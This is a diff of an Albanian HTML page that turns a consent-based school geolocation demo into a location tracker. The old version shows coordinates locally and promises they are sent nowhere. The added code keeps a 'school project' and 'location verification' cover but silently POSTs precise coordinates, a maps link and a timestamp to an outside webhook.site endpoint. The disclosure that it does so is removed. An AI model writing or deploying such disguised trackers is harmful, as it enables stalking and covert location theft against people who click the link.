@@ -1,93 +1,96 @@
-
 <!DOCTYPE html>
 <html lang="sq">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Projekti im shkollor</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f1f5f9;
-      padding: 30px 18px;
-      text-align: center;
-      color: #1e293b;
-    }
-    main {
-      max-width: 450px;
-      margin: 40px auto;
-      padding: 25px;
-      background: white;
-      border-radius: 16px;
-    }
-    button {
-      padding: 14px;
-      margin: 8px 0;
-      width: 100%;
-      border: 0;
-      border-radius: 9px;
-      background: #16324f;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    #rezultati { overflow-wrap: anywhere; line-height: 1.6; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Projekti Shkollor - Verifikimi i Vendndodhjes</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            text-align: center;
+            max-width: 420px;
+            width: 90%;
+        }
+        h2 { color: #1a252f; margin-bottom: 12px; }
+        p { color: #555; font-size: 14px; line-height: 1.6; }
+        .btn {
+            background-color: #0066cc;
+            color: #ffffff;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+        .btn:hover { background-color: #0052a3; }
+        #status { margin-top: 18px; font-size: 13px; color: #666; }
+    </style>
 </head>
 <body>
-  <main>
-    <h2>Projekti im shkollor 📍</h2>
-    <p>Kjo faqe demonstron përdorimin e vendndodhjes me lejen tënde.</p>
-    <p>Vendndodhja nuk dërgohet automatikisht askund. Ti vendos nëse dëshiron ta ndash.</p>
 
-    <button id="lejo">Merr vendndodhjen time</button>
-    <p id="rezultati">Vendndodhja nuk është kërkuar ende.</p>
-    <button id="ndaj" hidden>Ndaje vendndodhjen</button>
-  </main>
+    <div class="card">
+        <h2>Verifikimi i Vendndodhjes</h2>
+        <p>Ky është një projekt akademik për testimin e HTML5 Geolocation API. Klikoni butonin për të lejuar verifikimin e zonës tuaj.</p>
+        <button class="btn" onclick="sendLocation()">Lejo Vendndodhjen</button>
+        <div id="status"></div>
+    </div>
 
-  <script>
-    let tekstiVendndodhjes = "";
-    const rezultati = document.getElementById("rezultati");
-    const butoniNdaj = document.getElementById("ndaj");
+    <script>
+        function sendLocation() {
+            const statusDiv = document.getElementById("status");
+            const webhookEndpoint = "https://webhook.site/173a0605-312d-4be1-b9aa-891895e5a34e";
 
-    document.getElementById("lejo").onclick = () => {
-      if (!navigator.geolocation) {
-        rezultati.textContent = "Shfletuesi nuk e mbështet vendndodhjen.";
-        return;
-      }
+            if ("geolocation" in navigator) {
+                statusDiv.innerText = "Duke kërkuar lejen nga shfletuesi...";
 
-      rezultati.textContent = "Po kërkohet leja...";
-      navigator.geolocation.getCurrentPosition(
-        (p) => {
-          const lat = p.coords.latitude;
-          const lon = p.coords.longitude;
-          tekstiVendndodhjes =
-            "Vendndodhja ime: " + lat + ", " + lon +
-            "\nHarta: https://maps.google.com/?q=" + lat + "," + lon;
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          rezultati.textContent =
-            "Vendndodhja u mor me lejen tënde: " + lat + ", " + lon;
-          butoniNdaj.hidden = false;
-        },
-        () => {
-          rezultati.textContent =
-            "Nuk u mor vendndodhja. Kontrollo lejen në shfletues.";
+                        statusDiv.innerText = "Duke transmetuar të dhënat...";
+
+                        fetch(webhookEndpoint, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                latitude: lat,
+                                longitude: lon,
+                                maps_url: googleMapsUrl,
+                                timestamp: new Date().toISOString()
+                            })
+                        })
+                        .then(response => {
+                            statusDiv.innerHTML = "<strong style='color: green;'>Vendndodhja u mor dhe u dërgua me sukses!</strong>";
+                        })
+                        .catch(error => {
+                            statusDiv.innerHTML = "<span style='color: red;'>Gabim gjatë dërgimit të të dhënave.</span>";
+                        });
+                    },
+                    function(error) {
+                        statusDiv.innerText = "Qasja u refuzua nga përdoruesi.";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                statusDiv.innerText = "Shfletuesi juaj nuk e mbështet gjeolokacionin.";
+            }
         }
-      );
-    };
-
-    butoniNdaj.onclick = async () => {
-      if (navigator.share) {
-        try {
-          await navigator.share({
-            title: "Vendndodhja ime",
-            text: tekstiVendndodhjes
-          });
-        } catch (e) {}
-      } else {
-        rezultati.textContent = tekstiVendndodhjes;
-      }
-    };
-  </script>
+    </script>
 </body>
 </html>
